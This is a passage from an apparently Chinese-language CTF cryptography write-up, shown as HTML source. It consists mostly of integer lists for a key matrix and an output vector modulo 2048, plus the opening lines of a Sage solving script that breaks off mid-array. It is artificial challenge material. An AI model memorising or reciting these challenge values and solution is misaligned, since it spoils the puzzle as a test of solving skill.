180, 749], [262, 1072, 1188, 864, 960, 1069, 1931, 870, 573, 44, 38, 1525, 41, 1197, 1618, 857, 187, 804, 1828, 1525, 96, 204, 1565, 419, 1397, 1487, 1902, 1150, 650, 1562, 151, 564, 1836, 826, 95, 158, 495, 1357, 2005, 819, 783, 880], [636, 985, 809, 1165, 1478, 998, 408, 1897, 988, 421, 743, 1210, 1128, 1901, 943, 512, 1587, 1784, 911, 857, 434, 367, 1345, 104, 143, 357, 426, 1169, 1876, 1111, 1355, 371, 219, 1056, 432, 780, 1798, 151, 210, 1293, 807, 620], [29, 440, 1323, 1960, 1791, 1084, 777, 1314, 709, 1014, 1721, 108, 3, 961, 1253, 245, 862, 1899, 1519, 563, 347, 870, 820, 1787, 1323, 1113, 150, 1108, 1547, 1438, 845, 788, 1221, 1680, 795, 923, 1308, 1114, 153, 1985, 573, 132], [1979, 1831, 1374, 601, 1736, 1778, 1390, 138, 1295, 1582, 1777, 362, 647, 753, 627, 142, 1732, 994, 1911, 227, 1069, 1943, 1206, 1266, 1605, 827, 1153, 1375, 486, 1222, 1938, 794, 909, 629, 1232, 756, 935, 1374, 1148, 1312, 584, 901], [631, 136, 1835, 686, 1779, 1298, 1471, 1009, 107, 906, 4, 201, 859, 1808, 1743, 1286, 305, 266, 1374, 992, 531, 389, 1482, 362, 873, 533, 341, 1357, 85, 424, 207, 995, 275, 857, 1239, 770, 1355, 516, 178, 1560, 228, 1843], [1863, 1423, 786, 209, 1565, 1735, 1662, 1571, 749, 326, 1258, 1099, 1780, 1240, 865, 810, 7, 301, 1926, 692, 67, 978, 1172, 641, 839, 505, 1106, 423, 827, 1838, 388, 1749, 483, 880, 454, 773, 1961, 1153, 858, 963, 92, 829], [2009, 66, 520, 1027, 1804, 882, 42, 1826, 1732, 1093, 78, 1826, 1948, 734, 1486, 1285, 28, 1092, 174, 292, 1412, 24, 1454, 1015, 1560, 1154, 1168, 704, 1224, 1422, 784, 1353, 799, 1591, 613, 1318, 1623, 1151, 968, 297, 953, 1178], [1889, 727, 1189, 160, 1198, 1338, 970, 168, 1737, 1356, 1525, 590, 1773, 1397, 105, 1368, 401, 1569, 287, 1757, 801, 1818, 309, 1416, 1721, 1403, 1086, 583, 1203, 172, 1030, 647, 1497, 1222, 1581, 432, 1199, 1279, 5, 570, 556, 1936], [1514, 1162, 130, 1023, 538, 1772, 1525, 1709, 774, 1904, 1489, 837, 742, 797, 446, 1240, 847, 624, 1629, 2011, 867, 1097, 1814, 231, 381, 46, 363, 1560, 786, 1706, 800, 112, 748, 745, 407, 1290, 1093, 1268, 1536, 129, 1632, 1200], [698, 1238, 1100, 591, 1166, 1320, 620, 1044, 984, 744, 453, 1927, 1019, 1488, 1586, 1428, 412, 42, 776, 548, 2006, 409, 1767, 506, 1153, 1398, 391, 1597, 1794, 1203, 1034, 180, 433, 989, 1308, 1342, 1041, 1461, 782, 1284, 225, 492], [342, 15, 324, 551, 329, 1427, 186, 932, 774, 275, 311, 1562, 1557, 455, 329, 66, 0, 856, 792, 849, 878, 1362, 304, 1004, 1093, 1768, 793, 366, 965, 932, 1548, 759, 990, 1033, 720, 1344, 1438, 481, 1546, 985, 51, 1915], [1737, 1934, 1414, 131, 1328, 919, 569, 1731, 1771, 43, 1622, 322, 2000, 1918, 384, 995, 1282, 1380, 449, 1566, 1981, 286, 981, 704, 640, 551, 5, 1019, 598, 1079, 1150, 209, 464, 1555, 2, 1988, 1305, 127, 152, 701, 553, 1030], [817, 176, 737, 657, 1507, 514, 1453, 1656, 1229, 315, 368, 332, 460, 933, 1553, 1409, 1137, 1910, 209, 1906, 1487, 571, 996, 1489, 2011, 245, 1510, 115, 1155, 349, 67, 620, 759, 699, 1034, 1030, 984, 70, 1585, 1580, 121, 2], [526, 1875, 273, 1552, 641, 532, 613, 1092, 72, 1518, 600, 1380, 1088, 1371, 143, 1764, 1695, 1747, 1693, 2006, 614, 305, 1784, 1474, 1761, 730, 1968, 1803, 520, 917, 1976, 838, 525, 1769, 2005, 1625, 128, 728, 1729, 440, 288, 1530], [17, 1580, 403, 1813, 1514, 1603, 559, 1845, 408, 1942, 966, 1393, 544, 272, 1400, 1940, 412, 1968, 837, 945, 503, 409, 154, 264, 379, 218, 1847, 966, 1103, 125, 1935, 1381, 1552, 126, 1379, 397, 735, 1165, 162, 1696, 44, 238], [1401, 75, 99, 633, 922, 1093, 831, 1422, 1489, 46, 728, 1191, 292, 473, 640, 423, 766, 1991, 1561, 1897, 583, 385, 409, 1814, 1684, 879, 1414, 160, 1870, 577, 1394, 1088, 1248, 1425, 405, 1726, 77, 726, 1070, 642, 935, 1105], [1156, 765, 913, 323, 888, 727, 1826, 744, 54, 1009, 1790, 185, 1498, 1599, 1069, 62, 59, 32, 1280, 274, 728, 1831, 1879, 175, 708, 1466, 589, 263, 707, 1542, 1790, 1816, 1854, 992, 1402, 1354, 1501, 1200, 1653, 1067, 1756, 573], [645, 378, 356, 1474, 837, 1664, 45, 259, 289, 231, 1640, 244, 1864, 1022, 741, 1741, 1594, 1353, 991, 2002, 1969, 1522, 1852, 1031, 1296, 347, 1005, 1506, 760, 630, 462, 1302, 454, 466, 163, 488, 1239, 1554, 1482, 1918, 1394, 1244], [199, 1336, 969, 526, 2009, 801, 1762, 1185, 645, 1577, 1303, 707, 1731, 1212, 341, 121, 1984, 1108, 1794, 1078, 404, 248, 36, 42, 1757, 1051, 1485, 1542, 442, 666, 1596, 335, 1527, 1707, 1035, 1924, 386, 1566, 1509, 998, 977, 328], [1802, 1664, 1315, 607, 95, 477, 1534, 834, 1199, 1330, 738, 1339, 1313, 294, 1860, 1693, 2014, 1663, 549, 298, 1076, 618, 59, 749, 995, 1369, 558, 1703, 656, 1745, 1813, 1428, 612, 12, 624, 111, 850, 456, 596, 817, 383, 630], [221, 207, 1253, 1353, 992, 1732, 1038, 325, 1696, 662, 771, 1437, 1616, 396, 1568, 476, 232, 220, 1945, 1500, 1865, 1477, 1540, 1608, 823, 255, 342, 1912, 733, 1450, 1600, 1838, 69, 32, 1392, 1647, 820, 492, 1479, 1172, 993, 1412], [1207, 930, 69, 289, 1770, 162, 1442, 1071, 1598, 1900, 1409, 433, 1248, 1668, 314, 1201, 425, 334, 1373, 789, 975, 177, 1526, 49, 29, 174, 885, 264, 437, 287, 167, 1332, 1870, 1330, 1789, 372, 140, 1697, 1018, 642, 1894, 1829], [1710, 1301, 511, 1837, 116, 1749, 1727, 1479, 950, 951, 1104, 866, 838, 1248, 911, 988, 1275, 637, 1636, 250, 1603, 1783, 1821, 149, 388, 1474, 1366, 1788, 1038, 4, 201, 1003, 1246, 1914, 233, 1625, 1041, 1979, 649, 665, 1381, 1522], [855, 35, 317, 97, 400, 800, 107, 91, 1444, 1063, 552, 1363, 600, 767, 1313, 1117, 769, 541, 1466, 848, 935, 1918, 555, 1218, 1750, 1953, 1103, 1969, 1289, 634, 1310, 182, 1071, 1959, 544, 462, 377, 1696, 1597, 1936, 1285, 367], [598, 1990, 750, 584, 227, 1392, 1493, 748, 1671, 224, 1360, 1094, 1994, 1792, 1140, 779, 1939, 361, 289, 1235, 213, 517, 1485, 1390, 804, 132, 920, 536, 1235, 837, 298, 1139, 961, 1521, 431, 76, 2019, 884, 1991, 522, 342, 1609], [114, 1608, 1127, 722, 97, 140, 218, 617, 475, 1680, 214, 1595, 1373, 2021, 1031, 1243, 1526, 1562, 134, 684, 1178, 951, 1470, 1293, 1562, 744, 424, 336, 932, 897, 42, 1968, 1144, 195, 686, 46, 1032, 230, 1285, 132, 1514, 169], [1870, 622, 830, 283, 713, 1893, 270, 573, 732, 1233, 246, 1408, 1890, 119, 1529, 396, 1522, 486, 1371, 211, 1196, 671, 200, 1390, 1790, 547, 567, 1315, 1782, 1661, 756, 6, 1864, 626, 1318, 694, 1632, 1177, 1128, 1327, 405, 1283], [1714, 277, 1154, 369, 1472, 417, 541, 1244, 638, 1332, 512, 492, 1272, 929, 551, 34, 954, 362, 75, 1009, 725, 1481, 952, 1297, 1612, 289, 1684, 817, 112, 1731, 837, 1820, 1457, 1411, 1836, 454, 1984, 178, 46, 552, 282, 720], [1602, 921, 919, 637, 25, 1052, 1246, 831, 1332, 1664, 260, 1387, 1660, 19, 839, 844, 1934, 1606, 970, 539, 992, 1401, 1804, 1879, 297, 1325, 1671, 128, 667, 1169, 808, 1238, 366, 1409, 1369, 1997, 1775, 1586, 746, 278, 1134, 464], [1441, 1529, 415, 494, 1784, 1042, 799, 1701, 985, 404, 734, 1123, 1206, 1493, 1446, 562, 161, 1737, 1943, 753, 1782, 1341, 794, 333, 891, 973, 1656, 1995, 228, 523, 882, 228, 1010, 212, 262, 1948, 1573, 104, 767, 1607, 1333, 650], [918, 1741, 1195, 247, 2001, 1290, 1640, 1655, 1209, 1171, 1686, 1565, 1347, 1245, 350, 1234, 1271, 724, 213, 1994, 974, 677, 415, 1728, 1465, 222, 425, 616, 1649, 1114, 285, 753, 593, 1795, 552, 192, 247, 1286, 1995, 304, 402, 240], [1870, 843, 803, 905, 1256, 1668, 1850, 592, 1745, 1551, 957, 1095, 1492, 1413, 1604, 1944, 1424, 543, 169, 1811, 240, 996, 524, 556, 1189, 746, 1166, 157, 303, 965, 1848, 472, 1559, 419, 932, 2022, 966, 943, 1507, 1126, 1179, 1316], [1984, 296, 1135, 779, 530, 1212, 1122, 113, 805, 108, 990, 897, 1372, 774, 940, 633, 999, 1113, 873, 1933, 233, 236, 1006, 1767, 1575, 736, 1530, 843, 1373, 526, 1863, 2022, 189, 291, 1746, 1804, 769, 1355, 1745, 1355, 368, 666], [1714, 1278, 333, 2002, 379, 1788, 75, 174, 1369, 376, 1881, 553, 928, 1269, 1930, 622, 223, 278, 528, 1001, 918, 1018, 903, 1133, 420, 1389, 1796, 488, 410, 481, 1499, 228, 811, 1539, 91, 499, 1715, 249, 809, 1040, 1862, 1284], [560, 156, 1508, 1302, 194, 1062, 49, 1000, 1670, 1094, 1565, 1982, 1848, 204, 1846, 1565, 186, 1701, 1233, 855, 555, 938, 1489, 945, 1205, 1036, 1093, 47, 416, 1832, 173, 801, 684, 10, 1729, 1931, 27, 461, 1619, 1468, 1069, 1455], [270, 476, 948, 1474, 1209, 1968, 1193, 1683, 223, 1220, 730, 1122, 825, 1479, 922, 1684, 1526, 1532, 474, 1444, 1509, 1176, 1069, 1505, 1024, 1845, 1114, 762, 428, 893, 2012, 182, 1288, 851, 780, 228, 1393, 1834, 314, 402, 349, 189], [1677, 1049, 606, 1404, 1606, 164, 251, 1134, 893, 834, 680, 1260, 1428, 1743, 1658, 298, 705, 1450, 1064, 207, 787, 1094, 545, 559, 131, 1110, 1402, 1671, 545, 1885, 241, 525, 1333, 268, 710, 1602, 925, 1713, 1390, 458, 292, 1982], [1928, 173, 1894, 177, 1485, 2019, 1602, 1975, 1394, 813, 695, 998, 451, 859, 1913, 1307, 1200, 1900, 193, 1288, 509, 1568, 1664, 698, 1737, 1310, 1582, 634, 630, 1773, 315, 1225, 955, 195, 364, 1952, 1514, 107, 1103, 851, 194, 782], [264, 1210, 1424, 774, 1867, 33, 1584, 76, 1170, 1217, 1404, 218, 419, 1478, 1780, 600, 480, 1559, 1687, 418, 963, 164, 1276, 1606, 1443, 1141, 461, 586, 378, 1949, 0, 224, 552, 1828, 904, 804, 1040, 938, 821, 2006, 109, 304], [2005, 266, 213, 970, 1085, 1140, 1224, 1869, 554, 1495, 1256, 1662, 1671, 283, 281, 1432, 1107, 1460, 1535, 640, 755, 1295, 1764, 1638, 1929, 1592, 724, 1120, 1132, 728, 914, 930, 25, 1540, 689, 1661, 1814, 1974, 1594, 1634, 1954, 1322], [1672, 888, 1165, 368, 1940, 1662, 525, 1544, 1080, 1406, 637, 415, 159, 634, 309, 533, 608, 1102, 1054, 1297, 1460, 471, 1199, 613, 334, 1351, 1244, 333, 290, 395, 829, 1531, 565, 1405, 418, 1490, 279, 1690, 1435, 460, 729, 139], [49, 660, 1653, 4, 1984, 169, 1900, 437, 1182, 1834, 855, 335, 1494, 313, 1077, 776, 61, 1220, 593, 1938, 350, 1641, 295, 147, 335, 1894, 86, 639, 1958, 1730, 2021, 221, 1307, 1658, 103, 1697, 1900, 176, 1400, 1286, 271, 744], [856, 299, 1704, 1169, 1947, 426, 2020, 518, 218, 437, 731, 705, 33, 455, 1382, 270, 1512, 1120, 1425, 1225, 1360, 1071, 1092, 896, 1296, 1062, 1264, 396, 855, 1537, 1879, 173, 1567, 1548, 228, 897, 1534, 323, 744, 1564, 950, 20], [1309, 958, 2023, 811, 114, 1500, 77, 1031, 1204, 1811, 1178, 877, 1304, 308, 1898, 1763, 890, 1009, 631, 849, 1906, 376, 1214, 426, 171, 1096, 1157, 1704, 1060, 1332, 1811, 800, 712, 835, 169, 1598, 1948, 1384, 1143, 1209, 1431, 574], [1324, 725, 652, 99, 1910, 522, 871, 1609, 756, 1763, 1230, 1931, 487, 624, 1036, 1506, 114, 575, 800, 1054, 1027, 1309, 1506, 417, 1517, 270, 1610, 614, 219, 1512, 882, 1457, 1798, 1262, 655, 1271, 1066, 827, 1767, 1754, 1054, 345], [221, 1642, 258, 1504, 1569, 67, 57, 938, 1773, 218, 1635, 1514, 1038, 884, 1686, 508, 1050, 1104, 1121, 666, 887, 280, 1566, 384, 1328, 1336, 1906, 1477, 1969, 760, 447, 1887, 480, 92, 1959, 1917, 1132, 717, 741, 1876, 579, 132], [596, 286, 1471, 1206, 1778, 1982, 835, 566, 1347, 1842, 200, 675, 1659, 278, 1166, 172, 1985, 316, 724, 419, 1210, 800, 1637, 337, 218, 2020, 1207, 1992, 1339, 1096, 331, 836, 154, 854, 1242, 1069, 1290, 1428, 1024, 217, 350, 281], [1451, 1601, 1392, 472, 1165, 1190, 280, 653, 953, 350, 1309, 1981, 574, 1513, 1184, 2023, 1947, 591, 1745, 1305, 234, 1673, 2015, 1522, 187, 1921, 32, 1185, 29, 1394, 1297, 1880, 1381, 348, 622, 729, 1584, 813, 937, 808, 131, 1789], [1022, 1877, 831, 1567, 408, 1465, 1073, 1942, 1418, 268, 1267, 1806, 998, 6, 1366, 584, 92, 1137, 529, 659, 1085, 758, 2004, 384, 1099, 160, 998, 1311, 1914, 1002, 308, 1399, 1325, 2023, 1357, 23, 740, 223, 1865, 1, 2021, 1144], [101, 1226, 644, 128, 299, 631, 139, 55, 771, 409, 121, 609, 966, 823, 901, 556, 1396, 981, 365, 339, 1373, 154, 147, 1279, 1886, 1194, 1587, 311, 115, 1909, 1164, 1589, 1699, 1838, 1809, 1191, 536, 1686, 476, 390, 322, 1541], [874, 903, 917, 1557, 831, 1959, 1773, 930, 1513, 12, 1283, 156, 606, 10, 824, 1903, 1583, 752, 391, 73, 1733, 296, 1958, 1206, 989, 1151, 1123, 103, 1910, 1386, 940, 1522, 1883, 2009, 305, 1258, 134, 353, 49, 91, 1220, 124], [387, 1884, 286, 1704, 1453, 676, 543, 1445, 1130, 1136, 2010, 1428, 1146, 1190, 1355, 435, 1676, 1209, 139, 1614, 1758, 726, 1139, 1050, 372, 1877, 706, 1634, 881, 1067, 576, 1354, 260, 848, 821, 1390, 1754, 1117, 1449, 1683, 1949, 454], [441, 1929, 845, 2013, 618, 1070, 808, 836, 966, 401, 1437, 1209, 387, 1093, 1339, 1748, 190, 1947, 954, 1232, 1210, 1525, 724, 55, 980, 1943, 1107, 1053, 1791, 1514, 306, 8, 1344, 264, 140, 838, 802, 424, 1540, 1747, 891, 1020], [1048, 203, 1424, 469, 1786, 591, 1997, 1687, 539, 253, 278, 717, 1347, 1804, 279, 806, 912, 1837, 1566, 1135, 486, 1648, 1341, 1008, 637, 1699, 1396, 336, 1689, 330, 1033, 128, 1161, 1647, 669, 1788, 1711, 1980, 1882, 259, 138, 1467], [861, 228, 1485, 1832, 1658, 262, 1207, 719, 1982, 1108, 236, 92, 1894, 669, 437, 1976, 344, 2009, 1697, 874, 1486, 190, 1252, 1018, 561, 375, 1908, 45, 1934, 608, 1615, 658, 1234, 457, 409, 26, 1388, 1959, 1126, 656, 193, 507], [1324, 508, 1862, 1516, 693, 1819, 1583, 1472, 671, 1295, 1526, 1094, 518, 1189, 1583, 1345, 1054, 1788, 661, 960, 975, 927, 423, 380, 791, 1282, 1239, 756, 199, 1686, 745, 754, 1417, 1347, 1581, 626, 1772, 1465, 1985, 968, 1728, 1641], [1280, 392, 1695, 882, 1225, 1766, 683, 633, 1065, 1605, 1086, 500, 23, 1836, 583, 589, 1075, 810, 652, 1105, 511, 1756, 20, 756, 988, 1175, 134, 630, 320, 343, 213, 1885, 550, 146, 1121, 1650, 1101, 895, 294, 1710, 1995, 1022], [340, 1498, 491, 1964, 993, 1479, 1752, 263, 1156, 493, 1812, 1892, 595, 1919, 897, 1520, 1503, 1102, 809, 1374, 1693, 538, 1310, 372, 543, 245, 1912, 1193, 356, 14, 6, 1336, 821, 1111, 1678, 163, 298, 410, 740, 1039, 258, 1256], [542, 1181, 1683, 1782, 1355, 1598, 853, 1372, 1016, 1416, 466, 502, 528, 1428, 1742, 1748, 963, 1967, 844, 596, 996, 37, 201, 525, 147, 1576, 741, 532, 583, 192, 535, 762, 521, 198, 1204, 1460, 1848, 494, 1704, 43, 1437, 1946], [1308, 47, 975, 1577, 762, 1978, 0, 562, 1373, 1, 1046, 229, 542, 695, 582, 1455, 360, 245, 1343, 458, 1365, 1859, 1722, 1967, 19, 447, 1545, 1190, 1278, 675, 1992, 1769, 1435, 358, 10, 796, 155, 1000, 1615, 927, 1789, 823]]</span><br><span class="hljs-string">[644, 915, 892, 1015, 1876, 1611, 925, 334, 36, 41, 629, 1829, 1939, 1681, 224, 646, 502, 1284, 663, 1592, 1890, 1097, 1499, 1927, 30, 1202, 2012, 985, 1393, 106, 1220, 1687, 1712, 1077, 1957, 1418, 555, 514, 1552, 968, 1645, 1850, 919, 587, 463, 963, 1503, 1251, 3, 1251, 1711, 114, 190, 1891, 740, 1358, 1698, 295, 1313, 1812, 1067, 455, 1622, 541, 155, 1083]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯-2"><a href="#è§£é¢˜æ€è·¯-2" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br>P = <span class="hljs-number">2048</span><br>key = [[<span class="hljs-number">505</span>, <span class="hljs-number">469</span>, <span class="hljs-number">528</span>, <span class="hljs-number">1798</span>, <span class="hljs-number">373</span>, <span class="hljs-number">987</span>, <span class="hljs-number">981</span>, <span class="hljs-number">438</span>, <span class="hljs-number">1438</span>, <span class="hljs-number">1918</span>, <span class="hljs-number">768</span>, <span class="hljs-number">980</span>, <span class="hljs-number">720</span>, <span class="hljs-number">336</span>, <span class="hljs-number">1763</span>, <span class="hljs-number">585</span>, <span class="hljs-number">1582</span>, <span class="hljs-number">1020</span>, <span class="hljs-number">601</span>, <span class="hljs-number">1543</span>, <span class="hljs-number">1374</span>, <span class="hljs-number">1904</span>, <span class="hljs-number">340</span>, <span class="hljs-number">326</span>, <span class="hljs-number">947</span>, <span class="hljs-number">639</span>, <span class="hljs-number">1143</span>, <span class="hljs-number">371</span>, <span class="hljs-number">359</span>, <span class="hljs-number">953</span>, <span class="hljs-number">74</span>, <span class="hljs-number">657</span>, <span class="hljs-number">13</span>, <span class="hljs-number">359</span>, <span class="hljs-number">280</span>, <span class="hljs-number">1903</span>, <span class="hljs-number">687</span>, <span class="hljs-number">371</span>, <span class="hljs-number">114</span>, <span class="hljs-number">1232</span>, <span class="hljs-number">1573</span>, <span class="hljs-number">743</span>], [<span class="hljs-number">1310</span>, <span class="hljs-number">205</span>, <span class="hljs-number">491</span>, <span class="hljs-number">137</span>, <span class="hljs-number">1743</span>, <span class="hljs-number">1185</span>, <span class="hljs-number">74</span>, <span class="hljs-number">1797</span>, <span class="hljs-number">867</span>, <span class="hljs-number">755</span>, <span class="hljs-number">967</span>, <span class="hljs-number">454</span>, <span class="hljs-number">800</span>, <span class="hljs-number">568</span>, <span class="hljs-number">625</span>, <span class="hljs-number">492</span>, <span class="hljs-number">1835</span>, <span class="hljs-number">1586</span>, <span class="hljs-number">1462</span>, <span class="hljs-number">619</span>, <span class="hljs-number">760</span>, <span class="hljs-number">1144</span>, <span class="hljs-number">98</span>, <span class="hljs-number">1764</span>, <span class="hljs-number">1356</span>, <span class="hljs-number">991</span>, <span class="hljs-number">1392</span>, <span class="hljs-number">816</span>, <span class="hljs-number">849</span>, <span class="hljs-number">259</span>, <span class="hljs-number">1305</span>, <span class="hljs-number">842</span>, <span class="hljs-number">1250</span>, <span class="hljs-number">1983</span>, <span class="hljs-number">1339</span>, <span class="hljs-number">752</span>, <span class="hljs-number">1170</span>, <span class="hljs-number">1976</span>, <span class="hljs-number">958</span>, <span class="hljs-number">1710</span>, <span class="hljs-number">1216</span>, <span class="hljs-number">1927</span>], [<span class="hljs-number">1507</span>, <span class="hljs-number">1699</span>, <span class="hljs-number">1536</span>, <span class="hljs-number">1708</span>, <span class="hljs-number">739</span>, <span class="hljs-number">902</span>, <span class="hljs-number">1169</span>, <span class="hljs-number">1352</span>, <span class="hljs-number">886</span>, <span class="hljs-number">680</span>, <span class="hljs-number">1400</span>, <span class="hljs-number">1011</span>, <span class="hljs-number">132</span>, <span class="hljs-number">1561</span>, <span class="hljs-number">1001</span>, <span class="hljs-number">772</span>, <span class="hljs-number">1809</span>, <span class="hljs-number">208</span>, <span class="hljs-number">1161</span>, <span class="hljs-number">1691</span>, <span class="hljs-number">2015</span>, <span class="hljs-number">1099</span>, <span class="hljs-number">166</span>, <span class="hljs-number">1571</span>, <span class="hljs-number">551</span>, <span class="hljs-number">847</span>, <span class="hljs-number">663</span>, <span class="hljs-number">749</span>, <span class="hljs-number">1634</span>, <span class="hljs-number">1487</span>, <span class="hljs-number">960</span>, <span class="hljs-number">1675</span>, <span class="hljs-number">1017</span>, <span class="hljs-number">109</span>, <span class="hljs-number">63</span>, <span class="hljs-number">1714</span>, <span class="hljs-number">1540</span>, <span class="hljs-number">1515</span>, <span class="hljs-number">1382</span>, <span class="hljs-number">1569</span>, <span class="hljs-number">851</span>, <span class="hljs-number">985</span>], [<span class="hljs-number">451</span>, <span class="hljs-number">1919</span>, <span class="hljs-number">680</span>, <span class="hljs-number">76</span>, <span class="hljs-number">707</span>, <span class="hljs-number">1283</span>, <span class="hljs-number">933</span>, <span class="hljs-number">658</span>, <span class="hljs-number">945</span>, <span class="hljs-number">1801</span>, <span class="hljs-number">352</span>, <span class="hljs-number">673</span>, <span class="hljs-number">1072</span>, <span class="hljs-number">48</span>, <span class="hljs-number">1994</span>, <span class="hljs-number">1923</span>, <span class="hljs-number">1685</span>, <span class="hljs-number">1684</span>, <span class="hljs-number">1374</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1774</span>, <span class="hljs-number">1769</span>, <span class="hljs-number">1388</span>, <span class="hljs-number">1541</span>, <span class="hljs-number">604</span>, <span class="hljs-number">107</span>, <span class="hljs-number">1290</span>, <span class="hljs-number">787</span>, <span class="hljs-number">1622</span>, <span class="hljs-number">711</span>, <span class="hljs-number">323</span>, <span class="hljs-number">1846</span>, <span class="hljs-number">317</span>, <span class="hljs-number">1519</span>, <span class="hljs-number">1426</span>, <span class="hljs-number">123</span>, <span class="hljs-number">2015</span>, <span class="hljs-number">861</span>, <span class="hljs-number">544</span>, <span class="hljs-number">1401</span>, <span class="hljs-number">1869</span>, <span class="hljs-number">1833</span>], [<span class="hljs-number">862</span>, <span class="hljs-number">1316</span>, <span class="hljs-number">393</span>, <span class="hljs-number">1190</span>, <span class="hljs-number">2012</span>, <span class="hljs-number">687</span>, <span class="hljs-number">78</span>, <span class="hljs-number">61</span>, <span class="hljs-number">1391</span>, <span class="hljs-number">1238</span>, <span class="hljs-number">1282</span>, <span class="hljs-number">866</span>, <span class="hljs-number">1385</span>, <span class="hljs-number">1200</span>, <span class="hljs-number">292</span>, <span class="hljs-number">1702</span>, <span class="hljs-number">1599</span>, <span class="hljs-number">712</span>, <span class="hljs-number">1108</span>, <span class="hljs-number">653</span>, <span class="hljs-number">1711</span>, <span class="hljs-number">745</span>, <span class="hljs-number">100</span>, <span class="hljs-number">275</span>, <span class="hljs-number">322</span>, <span class="hljs-number">1671</span>, <span class="hljs-number">1723</span>, <span class="hljs-number">895</span>, <span class="hljs-number">661</span>, <span class="hljs-number">1726</span>, <span class="hljs-number">497</span>, <span class="hljs-number">342</span>, <span class="hljs-number">1010</span>, <span class="hljs-number">47</span>, <span class="hljs-number">1204</span>, <span class="hljs-number">1911</span>, <span class="hljs-number">1734</span>, <span class="hljs-number">1567</span>, <span class="hljs-number">1892</span>, <span class="hljs-number">954</span>, <span class="hljs-number">386</span>, <span class="hljs-number">1996</span>], [<span class="hljs-number">1333</span>, <span class="hljs-number">1928</span>, <span class="hljs-number">191</span>, <span class="hljs-number">1502</span>, <span class="hljs-number">1106</span>, <span class="hljs-number">579</span>, <span class="hljs-number">779</span>, <span class="hljs-number">512</span>, <span class="hljs-number">313</span>, <span class="hljs-number">308</span>, <span class="hljs-number">1277</span>, <span class="hljs-number">1547</span>, <span class="hljs-number">1814</span>, <span class="hljs-number">1434</span>, <span class="hljs-number">1867</span>, <span class="hljs-number">670</span>, <span class="hljs-number">543</span>, <span class="hljs-number">404</span>, <span class="hljs-number">1570</span>, <span class="hljs-number">179</span>, <span class="hljs-number">555</span>, <span class="hljs-number">1896</span>, <span class="hljs-number">289</span>, <span class="hljs-number">492</span>, <span class="hljs-number">1874</span>, <span class="hljs-number">1190</span>, <span class="hljs-number">1885</span>, <span class="hljs-number">748</span>, <span class="hljs-number">1375</span>, <span class="hljs-number">401</span>, <span class="hljs-number">1685</span>, <span class="hljs-number">618</span>, <span class="hljs-number">1614</span>, <span class="hljs-number">288</span>, <span class="hljs-number">2017</span>, <span class="hljs-number">571</span>, <span class="hljs-number">670</span>, <span class="hljs-number">873</span>, <span class="hljs-number">98</span>, <span class="hljs-number">563</span>, <span class="hljs-number">180</span>, <span class="hljs-number">749</span>], [<span class="hljs-number">262</span>, <span class="hljs-number">1072</span>, <span class="hljs-number">1188</span>, <span class="hljs-number">864</span>, <span class="hljs-number">960</span>, <span class="hljs-number">1069</span>, <span class="hljs-number">1931</span>, <span class="hljs-number">870</span>, <span class="hljs-number">573</span>, <span class="hljs-number">44</span>, <span class="hljs-number">38</span>, <span class="hljs-number">1525</span>, <span class="hljs-number">41</span>, <span class="hljs-number">1197</span>, <span class="hljs-number">1618</span>, <span class="hljs-number">857</span>, <span class="hljs-number">187</span>, <span class="hljs-number">804</span>, <span class="hljs-number">1828</span>, <span class="hljs-number">1525</span>, <span class="hljs-number">96</span>, <span class="hljs-number">204</span>, <span class="hljs-number">1565</span>, <span class="hljs-number">419</span>, <span class="hljs-number">1397</span>, <span class="hljs-number">1487</span>, <span class="hljs-number">1902</span>, <span class="hljs-number">1150</span>, <span class="hljs-number">650</span>, <span class="hljs-number">1562</span>, <span class="hljs-number">151</span>, <span class="hljs-number">564</span>, <span class="hljs-number">1836</span>, <span class="hljs-number">826</span>, <span class="hljs-number">95</span>, <span class="hljs-number">158</span>, <span class="hljs-number">495</span>, <span class="hljs-number">1357</span>, <span class="hljs-number">2005</span>, <span class="hljs-number">819</span>, <span class="hljs-number">783</span>, <span class="hljs-number">880</span>], [<span class="hljs-number">636</span>, <span class="hljs-number">985</span>, <span class="hljs-number">809</span>, <span class="hljs-number">1165</span>, <span class="hljs-number">1478</span>, <span class="hljs-number">998</span>, <span class="hljs-number">408</span>, <span class="hljs-number">1897</span>, <span class="hljs-number">988</span>, <span class="hljs-number">421</span>, <span class="hljs-number">743</span>, <span class="hljs-number">1210</span>, <span class="hljs-number">1128</span>, <span class="hljs-number">1901</span>, <span class="hljs-number">943</span>, <span class="hljs-number">512</span>, <span class="hljs-number">1587</span>, <span class="hljs-number">1784</span>, <span class="hljs-number">911</span>, <span class="hljs-number">857</span>, <span class="hljs-number">434</span>, <span class="hljs-number">367</span>, <span class="hljs-number">1345</span>, <span class="hljs-number">104</span>, <span class="hljs-number">143</span>, <span class="hljs-number">357</span>, <span class="hljs-number">426</span>, <span class="hljs-number">1169</span>, <span class="hljs-number">1876</span>, <span class="hljs-number">1111</span>, <span class="hljs-number">1355</span>, <span class="hljs-number">371</span>, <span class="hljs-number">219</span>, <span class="hljs-number">1056</span>, <span class="hljs-number">432</span>, <span class="hljs-number">780</span>, <span class="hljs-number">1798</span>, <span class="hljs-number">151</span>, <span class="hljs-number">210</span>, <span class="hljs-number">1293</span>, <span class="hljs-number">807</span>, <span class="hljs-number">620</span>], [<span class="hljs-number">29</span>, <span class="hljs-number">440</span>, <span class="hljs-number">1323</span>, <span class="hljs-number">1960</span>, <span class="hljs-number">1791</span>, <span class="hljs-number">1084</span>, <span class="hljs-number">777</span>, <span class="hljs-number">1314</span>, <span class="hljs-number">709</span>, <span class="hljs-number">1014</span>, <span class="hljs-number">1721</span>, <span class="hljs-number">108</span>, <span class="hljs-number">3</span>, <span class="hljs-number">961</span>, <span class="hljs-number">1253</span>, <span class="hljs-number">245</span>, <span class="hljs-number">862</span>, <span class="hljs-number">1899</span>, <span class="hljs-number">1519</span>, <span class="hljs-number">563</span>, <span class="hljs-number">347</span>, <span class="hljs-number">870</span>, <span class="hljs-number">820</span>, <span class="hljs-number">1787</span>, 